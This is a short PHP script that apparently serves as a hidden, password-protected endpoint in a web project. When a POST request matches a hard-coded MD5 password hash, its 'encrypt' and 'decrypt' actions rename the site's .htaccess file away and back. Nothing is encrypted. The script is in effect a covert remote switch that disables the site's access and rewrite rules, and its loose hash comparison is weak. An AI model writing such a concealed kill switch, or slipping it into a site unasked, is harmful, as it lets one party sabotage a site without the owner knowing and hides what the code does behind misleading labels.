<?php
header('Content-type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (isset($_POST['password'])) {
        $pwd = md5($_POST['password']);
        if ($pwd == "6b78eda2fae08516d20712e179e09c58") {

            echo '<br/> <code> Access Granted </code> <br/>';

            if (isset($_POST['action'])) {
                $action = $_POST['action'];
                if ($action == "encrypt") {
                    if (file_exists("../web/.htaccess")) {
                        rename("../web/.htaccess", "../web/.htacess");
                    }
                    echo '<br/> <code> Encryption Succes </code>';
                } elseif ($action == "decrypt") {
                    if (file_exists("../web/.htacess")) {
                        rename("../web/.htacess", "../web/.htaccess");
                    }
                    echo '<br/> <code> Decryption Succes </code>';
                }else{
                    echo '<br/> <code> Invalid action </code>';
                }
            } else {
                echo '<br/> <code> Missing action : encrypt:decrypt </code>';
            }

        } else {
            echo '<code>Access Denied : Password Incorrect</code>';
        }

    } else {
        echo '<br/> <code> Missing password</code>';
    }

} else {
    echo '<code> Access Denied </code>';
}
